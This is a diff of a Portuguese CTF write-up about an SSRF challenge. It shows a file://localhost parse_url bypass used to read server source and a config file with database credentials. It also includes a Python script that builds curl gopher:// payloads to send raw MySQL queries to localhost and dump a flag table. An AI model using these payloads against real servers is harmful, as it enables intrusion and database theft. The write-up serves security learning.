@@ -14,7 +14,7 @@ category: writeup
 <img src="https://i.imgur.com/x44sNn7.png">
 <img src="https://i.imgur.com/6qpAlUX.png">
 <p>Bem, parece que só podemos enviar coisas para o localhost, então, indo um pouco a fundo, podemos achar um pequeno bypass para isso, já que a aplicação não está barrando wrappers, temos a possibilidade de utilizar o file:// aqui:</p>
-<pre>
+{% highlight php %}
 php > var_dump(parse_url('file://localhost/../var/www/html/index.php"'));
 array(3) {
   ["scheme"]=>
@@ -24,14 +24,14 @@ array(3) {
   ["path"]=>
   string(27) "/../var/www/html/index.php""
 }
-</pre>
+{% endhighlight %}
 <br>
 <img src="https://i.imgur.com/knlEmbs.png">
 <br>
 <img src="https://i.imgur.com/K6IYvF2.png">
 <br>
 Ok, conseguimos o código da index, vamos dar uma olhada nele:
-<pre>
+{% highlight php %}
 include_once "config.php";
 if (isset($_POST['url'])&&!empty($_POST['url']))
 {
@@ -46,13 +46,13 @@ if(isset($_GET['debug']))
 {
 	show_source(__FILE__);
 }
-</pre>
+{% endhighlight %}
 <br>
 <p>que pena, eu não sabia que existia o debug aqui, mas ok, aqui não tem muito o que analisar, pois a função getUrlContent() está vindo muito provavelmente do config.php:</p>
 <br>
 <img src="https://i.imgur.com/btOBq77.png">
 <p>Aqui sim, temos o que analisar:</p>
-<pre>
+{% highlight php %}
 <?php
 $hosts = "localhost";
 $dbusername = "ssrf_user";
@@ -90,7 +90,7 @@ function getUrlContent($url){
 }
 initdb($conn);
 ?>
-</pre>
+{% endhighlight %}
 <p>É sempre interessante quando temos usuarios,senhas e etc presentes no código, vamos guardar, pois pode nos ser util futuramente.
 Analisando p initdb() você consegue ver que a função está criando um tabela chamada flag com uma coluna secret no banco de dados, caso ela ainda não exista...</p>
 
@@ -126,7 +126,7 @@ Query OK, 0 rows affected (0,10 sec)
 <p>A partir daqui, precisamos fazer isso virar uma url, e a forma mais facil de fazer isso, é usar o input do “Show and save data as” e setar ele para “Raw”:</p>
 <img src="https://i.imgur.com/bV97KbV.png">
 <p>Ok, agora, precisamos encodar isso tudo em um formato adequado para a url, na verdade não é muito dificil, bastaria adicionar % a cada dois bytes, mas eu encontrei um script que faz isso para nós:</p>
-<pre>
+{% highlight python %}
 def result(s):
   a = [s[i:i+2] for i in xrange(0, len(s), 2)]
   return "curl gopher://127.0.0.1:3306/_%" + "%".join(a)
@@ -135,8 +135,8 @@ if __name__ == "__main__":
   import sys
   s = sys.argv[1]
   print result(s)
-</pre>
-
+{% endhighlight %}
+<br>
 <img src="https://i.imgur.com/Gie5b2C.png">
 <img src="https://i.imgur.com/mJxrJjh.png">
 <p>Parece que funcionou, bem, mas como já haviamos visto antes, é criado um banco de dados com uma tabela flag com uma coluna secret, então, vamos dumpar ela com o gopher…</p>
